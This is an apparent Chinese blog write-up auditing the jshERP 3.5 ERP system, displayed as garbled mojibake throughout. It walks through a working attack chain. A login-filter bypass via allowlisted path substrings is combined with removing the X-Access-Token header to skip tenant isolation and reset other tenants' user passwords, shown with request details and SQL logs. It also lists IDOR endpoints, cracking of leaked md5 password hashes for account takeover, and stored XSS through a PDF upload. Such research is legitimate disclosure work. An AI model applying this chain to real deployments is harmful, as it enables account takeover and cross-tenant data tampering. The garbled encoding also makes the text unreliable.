3.5ç‰ˆæœ¬çš„jshERPé¡¹ç›®å˜æˆäº†å‰åç«¯åˆ†ç¦»çš„é¡¹ç›®ï¼Œåç«¯æ¯”è¾ƒå¥½å¯åŠ¨ï¼Œå¯åŠ¨å®Œåæ—¥å¿—é‡Œé¢ä¼šç»™ä½ ä¸€æ¡å¯åŠ¨å‰ç«¯é¡¹ç›®çš„å‘½ä»¤ è¿™ä¸ªæ—¶å€™æˆ‘å°±é‡åˆ°äº†ç‚¹é—®é¢˜ï¼Œæ‰§è¡Œnpm run serveä¼šé‡åˆ°ä¸€ç³»åˆ—çš„æŠ¥é”™ï¼Œä¸»è¦è¿˜æ˜¯ä¾èµ–å†²çªçš„é—®é¢˜ é¡¹ç›®éœ€è¦ vue-loader@^15.7.0ï¼ˆè¦æ±‚ webpack 5.xï¼‰ï¼Œä½†é¡¹ç›®ä¸­å·²å®‰è£…çš„ @vue/cli-plugin-babel ç­‰ä¾èµ–è¦æ±‚ webpack@^4.0.0ï¼Œå†²çªçš„ peer ä¾èµ–å¯¼è‡´ npm å®‰è£…å¤±è´¥ è§£å†³æ–¹æ¡ˆï¼š åœ¨ package.json ä¸­æ·»åŠ  resolutions å­—æ®µå¼ºåˆ¶æŒ‡å®š webpack ç‰ˆæœ¬ï¼š resolutions: webpack: ^4.47.0 ç„¶åè¿è¡Œï¼š npm install --force css-loader æˆ– style-loader ç‰ˆæœ¬è¿‡é«˜ï¼Œä¸ Webpack 4 ä¸å…¼å®¹ è§£å†³æ–¹æ¡ˆï¼šå°†ç‰ˆæœ¬é™ä½åˆ°webpack 4å¯ä»¥å…¼å®¹ npm install --save-dev css-loader@3.6.0 style-loader@1.3.0# å¦‚æœä½¿ç”¨ Sassnpm install --save-dev sass-loader@8.0.2 node-sass@4.14.1 éƒ½è§£å†³å®Œäº†ä¹‹åæ‰§è¡Œå‘½ä»¤ï¼šnpm run serveä¾¿å¯ä»¥æˆåŠŸå°†å‰ç«¯èµ·èµ·æ¥äº† å®¡è®¡å¼€å·¥ä¸€èˆ¬é„™äººå®¡è®¡çš„ç¬¬ä¸€æ­¥éƒ½æ˜¯å…ˆçœ‹pom.xmlæ–‡ä»¶ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å€¼å¾—æ³¨æ„çš„åœ°æ–¹ è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°æ•°æ®åº“æ˜¯mybatisï¼Œfastjsonçš„ç‰ˆæœ¬ä¸º1.2.83ï¼Œå­˜åœ¨æ¼æ´çš„ç‰ˆæœ¬ï¼Œå…ˆè®°ä¸‹æ¥ç•™ç€åé¢è¿›è¡Œæµ‹è¯• è€Œmybatisçš„æœªåšé¢„å¤„ç†çš„è¯æ‰€ç”¨çš„å±é™©å­—ç¬¦ä¾¿æ˜¯$ï¼Œæ‰€ä»¥æˆ‘ä»¬å…¨å±€æœç´¢ä¸€ä¸‹è¯¥ç¬¦å·ä»¥åŠï¼Œè·Ÿsqlç›¸å…³çš„xmlæ–‡ä»¶ä¸­ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œç‚¹è¿›å»åå‘ç°æ¯ä¸€ä¸ªsqlè¯­å¥éƒ½è¿›è¡Œäº†é¢„å¤„ç†ï¼Œæ˜¯åˆ©ç”¨#è¿›è¡Œå¤„ç†çš„ï¼Œä¸å­˜åœ¨sqlæ³¨å…¥äº†ï¼Œè½¬ç§»ç›®æ ‡ å®¡filterfilteræ–‡ä»¶ä¸­çš„doFilteræ–¹æ³•é€»è¾‘è¿˜æ˜¯æŒºæ¸…æ¥šçš„ï¼Œå…ˆæ£€æµ‹ä¸‹æ˜¯å¦ç™»å½•äº†ï¼Œæ²¡æœ‰ç™»å½•çš„è¯æ£€æµ‹è®¿é—®è·¯ç”±æ˜¯å¦åœ¨allowUrlsä¸­ï¼Œåœ¨çš„è¯å°±æ”¾è¿‡ï¼Œè¦ä¸ç„¶å°±å¼ºè½¬åˆ°ç™»å½•é¡µé¢ public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException HttpServletRequest servletRequest = (HttpServletRequest) request; HttpServletResponse servletResponse = (HttpServletResponse) response; String requestUrl = servletRequest.getRequestURI(); //å…·ä½“ï¼Œæ¯”å¦‚ï¼šå¤„ç†è‹¥ç”¨æˆ·æœªç™»å½•ï¼Œåˆ™è·³è½¬åˆ°ç™»å½•é¡µ Object userId = redisService.getObjectFromSessionByKey(servletRequest,userId); if(userId!=null) //å¦‚æœå·²ç™»å½•ï¼Œä¸é˜»æ­¢ chain.doFilter(request, response); return; if (requestUrl != null (requestUrl.contains(/doc.html) || requestUrl.contains(/user/login) || requestUrl.contains(/user/register))) chain.doFilter(request, response); return; if (null != allowUrls allowUrls.length 0) for (String url : allowUrls) if (requestUrl.startsWith(url)) chain.doFilter(request, response); return; servletResponse.setStatus(500); if(requestUrl != null !requestUrl.contains(/user/logout) !requestUrl.contains(/function/findMenuByPNumber)) servletResponse.getWriter().write(loginOut); åŒæ—¶è¯¥filteræ˜¯å¯¹æ ¹ç›®å½•ä¸‹çš„æ‰€æœ‰è·¯å¾„éƒ½ä¼šè¿›è¡Œä¸€ä¸ªæ£€æµ‹ï¼ŒfilterPathçš„å€¼ä¾¿æ˜¯ä¸Šé¢allowUrlsçš„å€¼ï¼Œä»¥ï¼ƒåˆ†å‰² @WebFilter(filterName = LogCostFilter, urlPatterns = /*, initParams = @WebInitParam(name = filterPath, value = /jshERP-boot/user/login#/jshERP-boot/user/weixinLogin#/jshERP-boot/user/weixinBind# + /jshERP-boot/user/registerUser#/jshERP-boot/user/randomImage# + /jshERP-boot/platformConfig/getPlatform#/jshERP-boot/v2/api-docs#/jshERP-boot/webjars# + /jshERP-boot/systemConfig/static#/jshERP-boot/api/plugin/wechat/weChat/share# + /jshERP-boot/api/plugin/general-ledger/pdf/voucher)) ç”±äºå‰é¢é‚£ä¸ªspringmvcé¡¹ç›®æœ‰å®¡åˆ°interceptorï¼Œæ‰€ä»¥ä¸€å¼€å§‹ä»¥ä¸ºé€šè¿‡/jshERP-boot/user/login/../../xxçš„æ–¹å¼åœ¨filteræ£€æµ‹çš„æ—¶å€™ä¼šå’Œç»è¿‡springmvcçš„interceptoræ£€æµ‹çš„æ—¶å€™ä¸€æ ·å…ˆè‡ªåŠ¨è§„èŒƒè·¯å¾„ä¸º/jshERP-boot/xxï¼Œè¿™æ ·å°±ç»•è¿‡ä¸äº†äº† åé¢å®é™…æµ‹å¾—æ—¶å€™å‘ç°filteræ£€æµ‹å¾—urlè·¯å¾„è¿˜æ˜¯åŸæœ¬çš„/jshERP-boot/user/login/../../xxï¼ˆæ€»çš„æ¥è¯´è¿˜æ˜¯filterå’Œinterceptoråœ¨ä»€ä¹ˆæ—¶å€™èµ·ä½œç”¨è¿˜æ˜¯æ²¡åˆ†æ¸…æ¥š é‚£æ ·å­çš„è¯å°±å¾ˆå¥½ç»•è¿‡äº†ï¼Œå› ä¸ºdoFilteræ–¹æ³•ä¸­æ£€æµ‹è·¯å¾„ç”¨çš„æ˜¯containså‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦è¾“å…¥çš„è·¯å¾„ä¸­æœ‰åŒ…å«allowUrlsä¸­çš„è·¯å¾„ä¾¿å¯ä»¥å®ç°ç»•è¿‡ç™»å½•äº†ï¼ˆè¿™åœ¨åé¢åˆå¦™ç”¨ï¼‰ å®¡configè¯¥é¡¹ç›®çš„configç›®å½•ä¸‹éƒ½æ˜¯ä¸€äº›é…ç½®æ–‡ä»¶ï¼Œé‡ç‚¹å…³æ³¨TenantConfigæ–‡ä»¶ tenantSqlParser.setTenantHandler(new TenantHandler() @Override public Expression getTenantId() String token = request.getHeader(X-Access-Token); Long tenantId = Tools.getTenantIdByToken(token); if (tenantId != 0L) return new LongValue(tenantId); // è¿”å›ç§Ÿæˆ·ID else return null; // è¶…ç®¡ä¸æ·»åŠ ç§Ÿæˆ·æ¡ä»¶ @Override public String getTenantIdColumn() return tenant_id; // æ•°æ®åº“ä¸­çš„ç§Ÿæˆ·IDåˆ—å @Override public boolean doTableFilter(String tableName) // ç³»ç»Ÿè¡¨ä¸æ·»åŠ ç§Ÿæˆ·æ¡ä»¶ if (jsh_material_property.equals(tableName) || jsh_sequence.equals(tableName) || jsh_function.equals(tableName) || jsh_platform_config.equals(tableName) || jsh_tenant.equals(tableName)) return true; // è·³è¿‡ç§Ÿæˆ·è¿‡æ»¤ return false; // éœ€è¦æ·»åŠ ç§Ÿæˆ·æ¡ä»¶ ); ç§Ÿæˆ·IDè·å–é€»è¾‘ï¼š ä»è¯·æ±‚å¤´ X-Access-Token ä¸­è§£æç§Ÿæˆ·ID ç§Ÿæˆ·IDä¸º 0 æ—¶è¡¨ç¤ºè¶…çº§ç®¡ç†å‘˜ï¼ˆä¸æ·»åŠ ç§Ÿæˆ·è¿‡æ»¤æ¡ä»¶ï¼‰ å…¶ä»–ç§Ÿæˆ·è‡ªåŠ¨æ·»åŠ  tenant_id = ç§Ÿæˆ·ID æ¡ä»¶ è¡¨è¿‡æ»¤è§„åˆ™ï¼š ç³»ç»Ÿè¡¨ï¼ˆå¦‚ jsh_tenant, jsh_functionï¼‰ä¸æ·»åŠ ç§Ÿæˆ·æ¡ä»¶ ä¸šåŠ¡è¡¨ï¼ˆå¦‚ç”¨æˆ·è¡¨ã€è®¢å•è¡¨ï¼‰è‡ªåŠ¨æ·»åŠ ç§Ÿæˆ·æ¡ä»¶ SQL è§£æå™¨é…ç½® ç§Ÿæˆ·SQLè§£æå™¨ ListISqlParser sqlParserList = new ArrayList();TenantSqlParser tenantSqlParser = new TenantSqlParser();sqlParserList.add(tenantSqlParser);paginationInterceptor.setSqlParserList(sqlParserList); å°†ç§Ÿæˆ·è§£æå™¨åŠ å…¥åˆ†é¡µæ’ä»¶ï¼Œå®ç° è‡ªåŠ¨æ”¹å†™SQL è‡ªå®šä¹‰SQLè¿‡æ»¤å™¨ paginationInterceptor.setSqlParserFilter(metaObject - MappedStatement ms = SqlParserHelper.getMappedStatement(metaObject); // æŒ‡å®šæ–¹æ³•è·³è¿‡ç§Ÿæˆ·è¿‡æ»¤ return switch (ms.getId()) case com.jsh.erp.datasource.mappers.UserMapperEx.getUserByWeixinOpenId, com.jsh.erp.datasource.mappers.UserMapperEx.updateUserWithWeixinOpenId, com.jsh.erp.datasource.mappers.UserMapperEx.getUserListByUserNameOrLoginName, com.jsh.erp.datasource.mappers.UserMapperEx.disableUserByLimit, com.jsh.erp.datasource.mappers.RoleMapperEx.getRoleWithoutTenant, com.jsh.erp.datasource.mappers.LogMapperEx.insertLogWithUserId, com.jsh.erp.datasource.mappers.UserBusinessMapperEx.getBasicDataByKeyIdAndType - true; default - false; ;); ç‰¹æ®Šæ–¹æ³•è·³è¿‡ç§Ÿæˆ·è¿‡æ»¤ï¼š å¾®ä¿¡ç™»å½•ç»‘å®šç›¸å…³æ–¹æ³•ï¼ˆå¦‚ getUserByWeixinOpenIdï¼‰ ç³»ç»Ÿç®¡ç†æ–¹æ³•ï¼ˆå¦‚ disableUserByLimitï¼‰ æ—¥å¿—è®°å½•ï¼ˆinsertLogWithUserIdï¼‰ åŸºç¡€æ•°æ®è·å–ï¼ˆgetBasicDataByKeyIdAndTypeï¼‰ Mapper æ‰«æé…ç½® @Beanpublic MapperScannerConfigurer mapperScannerConfigurer() MapperScannerConfigurer scannerConfigurer = new MapperScannerConfigurer(); scannerConfigurer.setBasePackage(com.jsh.erp.datasource.mappers*); return scannerConfigurer; æ‰«ææŒ‡å®šåŒ…ä¸‹çš„ MyBatis Mapper æ¥å£ ç›¸å½“äº @MapperScan(com.jsh.erp.datasource.mappers*) ç®€å•çš„æ¥è¯´å°±æ˜¯é™¤äº†å‡ ä¸ªç‰¹å®šçš„è¡¨å¤–ï¼Œå‰©ä¸‹çš„è¡¨åœ¨è¿›è¡Œå¢åˆ æ”¹æŸ¥çš„æ—¶å€™éƒ½ä¼šè‡ªåŠ¨æ ¹æ®æŠ¥å¤´ä¸­çš„X-Access-Tokenå€¼æ¥è¿›è¡Œæ¡ä»¶æ·»åŠ ï¼ˆåˆšçœ‹å®Œçš„æ—¶å€™è¿˜æ²¡æœ‰æ„è¯†åˆ°é—®é¢˜çš„ä¸¥é‡æ€§ è¶Šæƒå¼€å§‹å¯¹é¡¹ç›®çš„å„ä¸ªåŠŸèƒ½ç‚¹è¿›è¡Œæµ‹è¯•ï¼Œç”±äºæ˜¯è¦æŒ–æ´ï¼Œæ‰€ä»¥è‚¯å®šå…ˆä»ä¸€æ—¦æœ‰æ´ç„¶åé€ æˆå±å®³ä¼šæ¯”è¾ƒå¤§çš„åŠŸèƒ½ç‚¹å¼€å§‹æµ‹è¯•ï¼Œè¿™é‡Œæˆ‘å…ˆä»ç³»ç»Ÿç®¡ç†çš„è§’è‰²ç®¡ç†é¡µé¢è¿›è¡Œæµ‹è¯•ï¼Œé¡ºè—¤æ‘¸ç“œå¼€å®¡comjsherpcontrollerUserController.java resetPwdæ–¹æ³•ä¸€å¼€å§‹ä¾¿å¸å¼•äº†æˆ‘çš„çœ¼çƒ @PostMapping(value = /resetPwd)@ApiOperation(value = é‡ç½®å¯†ç )public String resetPwd(@RequestBody JSONObject jsonObject, HttpServletRequest request) throws Exception MapString, Object objectMap = new HashMap(); Long id = jsonObject.getLong(id); String password = 123456; String md5Pwd = Tools.md5Encryp(password); int update = userService.resetPwd(md5Pwd, id); if(update 0) return returnJson(objectMap, SUCCESS, ErpInfo.OK.code); else return returnJson(objectMap, ERROR, ErpInfo.ERROR.code); ç»§ç»­å¾€ä¸Šæ‰¾resetPwdæ–¹æ³•ï¼Œåšäº†ä¸ªé™åˆ¶ä¸èƒ½å¤Ÿé‡ç½®è¶…ç®¡å¯†ç  å¾€ä¸Šæ‰¾updateByPrimaryKeySelectiveæ–¹æ³•ï¼Œèµ°åˆ°xmlæ–‡ä»¶é‡Œé¢åå‘ç°è¯¥mybatisè¯­å¥ä»…é€šè¿‡ä¼ å…¥çš„idå€¼è¿›è¡Œåˆ¤æ–­ï¼Œæ•´ä¸ªä»£ç é€»è¾‘åˆ°mybatisè¯­å¥çš„è¿‡ç¨‹ä¸­éƒ½æ²¡æœ‰å¯¹æ˜¯è°åˆ é™¤çš„è¿›è¡Œä¸€ä¸ªåˆ¤æ–­ï¼Œæ¯«æ— ç–‘é—®è¿™å°±æ˜¯ä¸€ä¸ªçº¯çº¯çš„æ°´å¹³è¶Šæƒæ¼æ´ å¤±è´¥è¯ä¸å¤šè¯´å¼€å§‹æµ‹è¯•ï¼Œæˆ‘ä»¬å…ˆæ‹¦æˆªä¸€ä¸ªé‡ç½®å¯†ç çš„è¯·æ±‚åŒ…ï¼Œçœ‹åˆ°äº†æ˜¯é€šè¿‡jsonä¼ é€’idå‚æ•° ä¿®æ”¹idä¸º133ï¼ˆé‚£ä¸ªè´¦å·æ˜¯æˆ‘è‡ªå·±æå‰æ³¨å†Œçš„ï¼‰ï¼ŒæŸ¥çœ‹è¿”å›åŒ… ï¼Ÿï¼Ÿï¼Ÿï¼Œé‡ç½®å¤±è´¥äº†ï¼Œä¸ä¿¡é‚ªçš„æˆ‘å¼€å¯äº†è°ƒè¯•ï¼Œå¯å°±æ˜¯æ‰¾ä¸åˆ°åŸå› åœ¨å“ªé‡Œï¼Œç›´åˆ°æˆ‘å‘ç°äº†æ—¥å¿—é‡Œé¢ä¼šè®°å½•è°ƒç”¨çš„å…·ä½“sqlè¯­å¥å’Œå‚æ•°å€¼ ç»ˆäºå‘ç°äº†çœŸç›¸ 2025/08/06-20:04:44 DEBUG [http-nio-9999-exec-9] com.jsh.erp.datasource.mappers.UserMapper.selectByPrimaryKey - == Preparing: SELECT id, username, login_name, password, leader_flag, position, department, email, phonenum, ismanager, isystem, Status, description, remark, weixin_open_id, tenant_id FROM jsh_user WHERE jsh_user.tenant_id = 63 AND id = ? 2025/08/06-20:04:44 DEBUG [http-nio-9999-exec-9] com.jsh.erp.datasource.mappers.UserMapper.selectByPrimaryKey - == Parameters: 133(Long)2025/08/06-20:04:44 DEBUG [http-nio-9999-exec-9] com.jsh.erp.datasource.mappers.UserMapper.selectByPrimaryKey - == Total: 02025/08/06-20:04:44 ERROR [http-nio-9999-exec-9] com.jsh.erp.exception.GlobalExceptionHandler - Global Exception Occured = url : http://localhost:9999/jshERP-boot/user/resetPwd, msg : null åœ¨æ‰§è¡Œé‡ç½®å¯†ç çš„sqlè¯­å¥ä¹‹å‰å…ˆè¿›è¡Œäº†ä¸€æ¬¡æŸ¥æ‰¾æ“ä½œï¼Œçœ‹æ˜¯å¦èƒ½å¤Ÿæ‰¾åˆ°è¦ä¿®æ”¹çš„æ•°æ® SELECT id, username, login_name, password, leader_flag, position, department, email, phonenum, ismanager, isystem, Status, description, remark, weixin_open_id, tenant_id FROM jsh_user WHERE jsh_user.tenant_id = 63 AND id = ? å“‡å“¦ï¼Œwhereå­å¥é‡Œé¢æ€ä¹ˆè‡ªå·±å¤šäº†ä¸€ä¸ªæ¡ä»¶jsh_user.tenant_id 63ï¼Œæ˜æ˜é€šè¿‡jsonä¼ å‚è¿‡å»çš„å‚æ•°åªæœ‰ä¸€ä¸ªid ç„¶åçªç„¶æƒ³åˆ°äº†å‰é¢çœ‹åˆ°çš„TenantConfigç±»ä»£ç ï¼Œè‡ªåŠ¨è¿›è¡Œæ¡ä»¶çš„æ·»åŠ ã€‚ã€‚ã€‚ã€‚ã€‚ åŸæ¥é¢„é˜²æ°´å¹³è¶Šæƒçš„æ“ä½œåœ¨è¿™é‡Œç­‰ç€æˆ‘ï¼Œé‚£ä¹ˆè¿™æ ·çš„æ€è·¯å°±èµ°ä¸é€šäº† æŸ³æš—èŠ±æ˜åˆä¸€æ‘ä¸æ­»å¿ƒçš„æˆ‘è¿”å›åå¤è§‚æ‘©TenantConfigä»£ç ï¼Œä»¥åŠçœ‹æ—¥å¿—é‡Œé¢çš„sqlè¯­å¥ï¼ˆç„¶åæ»šå»åƒäº†ä¸ªé¥­doge åƒå®Œå›æ¥çªç„¶è„‘å­çµå…‰ä¸€é—ªï¼ŒTenantConfigé‡Œé¢è‡ªåŠ¨æ·»åŠ çš„æ¡ä»¶æ˜¯åœ¨X-Access-Tokenæ ‡å¤´çš„æ•°æ®å¤„è·å–çš„ X-Access-Token: a60964b01528475ab2e38e863c025be7_63ä»è¿™é‡Œæ‹¿åˆ°äº†63è¿™ä¸ªæ•°æ®ï¼Œé‚£æ˜¯ä¸æ˜¯å¯ä»¥ä»£è¡¨æˆ‘æŠŠè¯¥æ ‡å¤´çš„æ•°æ®ä¿®æ”¹ä¸ºX-Access-Token: a60964b01528475ab2e38e863c025be7_133çš„è¯ï¼Œæ‹¿åˆ°çš„æ•°æ®å°±æ˜¯133 è¯ä¸å¤šè¯´ï¼Œèµ¶ç´§å°è¯• loginoutï¼Œå°±æ˜¯ä»£è¡¨æœªç™»å½•ï¼Œå¹²è„†åˆ©è½çš„å¤±è´¥äº†ï¼Œæ²¡æˆ‘æƒ³çš„é‚£ä¹ˆç®€å• æ— å¦¨ï¼Œè„‘å­åˆçµå…‰ä¸€é—ªï¼Œåç«¯ä»X-Access-Tokenæ ‡å¤´è·å–æ•°æ®ï¼Œé‚£ä¹ˆæˆ‘åªè¦æŠŠè¿™ä¸ªæ ‡å¤´ç»™åˆ äº†æ•°æ®ä¸å°±è·å–ä¸åˆ°äº†å˜›ï¼ŒæŠŠX-Access-Tokenåˆ å»ä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬å¤„äºæœªç™»å½•çš„çŠ¶æ€ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦ç»•è¿‡filterçš„æ£€æµ‹ï¼Œä¸Šé¢æœ‰è®²è¿‡å¦‚ä½•ç»•è¿‡ï¼Œè¿™ä¸¤ä¸€é…åˆä¸å°±å¯ä»¥å®Œç¾è§£å†³è¿™ä¸ªé—®é¢˜äº† å°è¯•å°è¯• èŠœæ¹–ï¼ŒæˆåŠŸæˆåŠŸï¼Œç…ä¸€çœ¼æ—¥å¿— 2025/08/06-20:25:14 DEBUG [http-nio-9999-exec-10] com.jsh.erp.datasource.mappers.UserMapper.selectByPrimaryKey - == Preparing: SELECT id, username, login_name, password, leader_flag, position, department, email, phonenum, ismanager, isystem, Status, description, remark, weixin_open_id, tenant_id FROM jsh_user WHERE id = ? 2025/08/06-20:25:14 DEBUG [http-nio-9999-exec-10] com.jsh.erp.datasource.mappers.UserMapper.selectByPrimaryKey - == Parameters: 132(Long)2025/08/06-20:25:14 DEBUG [http-nio-9999-exec-10] com.jsh.erp.datasource.mappers.UserMapper.selectByPrimaryKey - == Total: 12025/08/06-20:25:14 DEBUG [http-nio-9999-exec-10] com.jsh.erp.datasource.mappers.UserMapper.updateByPrimaryKeySelective - == Preparing: UPDATE jsh_user SET password = ? WHERE id = ? 2025/08/06-20:25:14 DEBUG [http-nio-9999-exec-10] com.jsh.erp.datasource.mappers.UserMapper.updateByPrimaryKeySelective - == Parameters: e10adc3949ba59abbe56e057f20f883e(String), 132(Long)2025/08/06-20:25:14 DEBUG [http-nio-9999-exec-10] com.jsh.erp.datasource.mappers.UserMapper.updateByPrimaryKeySelective - == Updates: 1 æœç„¶å’Œä¸Šé¢æ¨æµ‹çš„æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ï¼ŒæŸ¥è¯¢è¯­å¥SELECT id, username, login_name, password, leader_flag, position, department, email, phonenum, ismanager, isystem, Status, description, remark, weixin_open_id, tenant_id FROM jsh_user WHERE id = ? ä¸­çš„whereå­å¥çš„æ¡ä»¶åªå‰©ä¸‹äº†idï¼Œè€Œæ²¡æœ‰tennant_id é‚£å°±å¾ˆå¥½äº†ï¼Œä»¥ç‚¹ç ´é¢ï¼Œä¸€å¤„é€šå¤„å¤„é€šï¼Œæ¥ä¸‹æ¥åªè¦æ˜¯å¯¹äºæ•°æ®åº“æ“ä½œçš„è¯­å¥å†™çš„ä¸ä¸¥è°¨é‚£ä¹ˆä¾¿å­˜åœ¨è¶Šæƒæ¼æ´äº† å°±æ‹¿comjsherpcontrollerUserController.javaæ–‡ä»¶ä¸­å°±æœ‰é‡ç½®å¯†ç ï¼Œåˆ é™¤ç”¨æˆ·ç­‰æ“ä½œ å¤§é‡çš„è¶Šæƒåé¢åŠŸèƒ½ç‚¹ä¸€ä¸ªä¸ªæµ‹è¯•ï¼Œå‘ç°äº†å¤§é‡çš„è¶Šæƒ åŒ…æ‹¬ä½†ä¸é™äºå¦‚ä¸‹ï¼š comjsherpcontrollerSupplierController.javaçš„batchSetStatusæ–¹æ³•å­˜åœ¨è¶Šæƒæ¼æ´ï¼Œå¯ä»¥ä»»æ„æ§åˆ¶æ‰€æœ‰ä¾›åº”å•†çš„çŠ¶æ€ comjsherpcontrollerResourceController.javaä¸­çš„updateResourceæ–¹æ³•å­˜åœ¨è¶Šæƒï¼Œå¹¶ä¸”ä¼ å‚ä¸­çš„tenantIdå¯ä»¥éšä¾¿æ”¹ï¼Œæ”¹äº†ä¹‹åå¯¹åº”çš„ä¿¡æ¯ä¾¿ä¼šè·Ÿç€ä¿®æ”¹å¹¶è½¬ç§»åˆ°ä¼ é€’çš„tenantIdå€¼çš„éº¾ä¸‹ï¼Œç›¸å½“äºä¹Ÿæ˜¯å®ç°äº†å¦ç±»çš„åˆ é™¤åŠŸèƒ½ ï¼ˆè¯¥ç±»ä¸‹çš„deleteæ–¹æ³•ä¹Ÿå­˜åœ¨è¶Šæƒæ“ä½œï¼‰ ä¸‹é¢æ˜¯å¯¹ä¾›åº”å•†çš„è¶Šæƒæ›´æ–°æ“ä½œï¼š comjsherpcontrollerRoleController.javaä¸­çš„allListæ–¹æ³•æœªæˆæƒè®¿é—®å¯ä»¥å¾—åˆ°æ‰€æœ‰roleæ•°æ®ï¼Œç™»å½•ä¹‹ååªèƒ½å¾—åˆ°å„è‡ªç§Ÿæˆ·ä¸‹çš„roleæ•°æ® é€šè¿‡ä¸Šé¢è·å–åˆ°æ‰€æœ‰roleæ•°æ®ï¼Œé…åˆè¯¥ç±»ä¸­çš„batchSetStatusæ–¹æ³•å®ç°è¶Šæƒï¼Œå¯ä»¥ä»»æ„æ§åˆ¶æ‰€æœ‰roleçš„çŠ¶æ€ comjsherpcontrollerResourceController.javaä¸­çš„getListæ–¹æ³•å­˜åœ¨è¶Šæƒè®¿é—®ï¼Œå¹¶ä¸”é€šè¿‡è¯¥æ–¹æ³•æˆ‘ä»¬å¯ä»¥è·å–åˆ°ä¸åŒç§Ÿæˆ·ç»è¿‡md5åŠ å¯†åçš„å¯†ç ï¼Œç”¨è‡ªå·±çš„çˆ†ç ´è„šæœ¬å°è¯•çˆ†ç ´æˆ–è€…æ‹¿å»ä¸“ä¸šå¹³å°è§£å¯†éƒ½æ˜¯å¯ä»¥çš„ï¼Œå¾—åˆ°æ˜æ–‡å¯†ç ä¹‹åä¾¿å¯ä»¥å†æ¬¡å®ç°ä»»æ„è´¦å·æ¥ç®¡äº† comjsherpcontrollerPersonController.javaä¸­çš„getAllListæ–¹æ³•å­˜åœ¨è¶Šæƒæ‰§è¡Œï¼Œè·å–æ‰€æœ‰ç»æ‰‹äººä¿¡æ¯ï¼ˆçœ‹äº†ä¸‹è¯¥ç±»ä¸‹çš„æ‰€æœ‰æ–¹æ³•éƒ½å¯ä»¥å®ç°è¶Šæƒï¼‰ comjsherpcontrollerAccountController.javaä¸­çš„getAccountæ–¹æ³•å­˜åœ¨æœªæˆæƒ and so onã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ æ–‡ä»¶ä¸Šä¼ åé¢åœ¨æµ‹è¯•ç³»ç»Ÿå‚æ•°ç›¸å…³åŠŸèƒ½ç‚¹çš„æ—¶å€™æ„å¤–å‘ç°ç›¸å¯¹åº”çš„ç±»ä¸­æœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„æ–¹æ³•å¹¶æœªå‡ºç°åœ¨é¡µé¢ä¸Šï¼Œå³comjsherpcontrollerSystemConfigController.javaçš„uploadæ–¹æ³• @PostMapping(value = /upload)@ApiOperation(value = æ–‡ä»¶ä¸Šä¼ ç»Ÿä¸€æ–¹æ³•)public BaseResponseInfo upload(HttpServletRequest request, HttpServletResponse response) BaseResponseInfo res = new BaseResponseInfo(); try String savePath = ; String bizPath = request.getParameter(biz); if (bill.equals(bizPath) || financial.equals(bizPath) || material.equals(bizPath)) MultipartHttpServletRequest multipartRequest = (MultipartHttpServletRequest) request; MultipartFile file = multipartRequest.getFile(file);// è·å–ä¸Šä¼ æ–‡ä»¶å¯¹è±¡ if(fileUploadType == 1) savePath = systemConfigService.uploadLocal(file, bizPath, request); else if(fileUploadType == 2) savePath = systemConfigService.uploadAliOss(file, bizPath, request); if(StringUtil.isNotEmpty(savePath)) res.code = 200; res.data = savePath; else res.code = 500; res.data = ä¸Šä¼ å¤±è´¥ï¼; else res.code = 505; res.data = æ–‡ä»¶åˆ†ç±»é”™è¯¯ï¼; catch (Exception e) logger.error(e.getMessage(), e); res.code = 500; res.data = ä¸Šä¼ å¤±è´¥ï¼; return res; bizå‚æ•°éœ€è¦æ»¡è¶³æ˜¯billæˆ–financialæˆ–materialä¸‰ä¸ªä¸­çš„ä¸€ä¸ªæ‰å¯ä»¥èµ°è¿›ifä¸­ å¾€ä¸‹çœ‹æˆ‘ä»¬å¯ä»¥çŸ¥é“æ–‡ä»¶å­˜å‚¨çš„ä½ç½®æœ‰ä¸¤ä¸ªï¼Œæœ¬åœ°å’Œé˜¿é‡Œäº‘ï¼Œé€šè¿‡fileUploadTypeå‚æ•°è¿›è¡Œåˆ¤æ–­ è€Œè¯¥å‚æ•°çš„å€¼é»˜è®¤ç­‰äº1ï¼Œäºæ˜¯ä¸Šä¼ çš„æ–‡ä»¶é»˜è®¤å­˜å‚¨äºæœ¬åœ° æ‰€ä»¥æˆ‘ä»¬è·Ÿè¿›uploadLocalæ–¹æ³• å¯ä»¥çœ‹åˆ°å¯¹äºä¸Šä¼ çš„æ–‡ä»¶æ˜¯åšäº†è¾ƒä¸ºä¸¥æ ¼çš„é™åˆ¶ï¼Œé˜²æ­¢äº†è·¯å¾„ç©¿è¶Šä¹Ÿé™åˆ¶äº†æ–‡ä»¶åç¼€ å‘ç°å…è®¸ä¸Šä¼ çš„æ–‡ä»¶åç¼€åŒ…å«zipï¼Œä½†æ˜¯ä¼¼ä¹æ²¡æœ‰è§£å‹çš„ç›¸å…³ä»£ç ï¼Œé‚æ—  é‚£åªå‰©ä¸‹ä¸€ä¸ªpdfåç¼€å¯ä»¥åˆ©ç”¨äº†ï¼Œä¸Šä¼ ä¸€ä¸ªpdf xssæ–‡ä»¶ï¼Œæ‰“ä¸€ä¸ªå­˜å‚¨å‹xssï¼ˆæ²¡å•¥ç”¨ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ Swaggeræ³„éœ²Swaggeræ˜¯ä¸€ä¸ªè§„èŒƒå’Œå®Œæ•´çš„æ¡†æ¶ï¼Œç”¨äºç”Ÿæˆã€æè¿°ã€è°ƒç”¨å’Œå¯è§†åŒ– RESTful é£æ ¼çš„ Web æœåŠ¡ã€‚æ€»ä½“ç›®æ ‡æ˜¯ä½¿å®¢æˆ·ç«¯å’Œæ–‡ä»¶ç³»ç»Ÿä½œä¸ºæœåŠ¡å™¨ä»¥åŒæ ·çš„é€Ÿåº¦æ¥æ›´æ–°ã€‚ springé¡¹ç›®ä¸­çš„é…ç½®å‚è€ƒï¼šè§£å†³ Swagger API 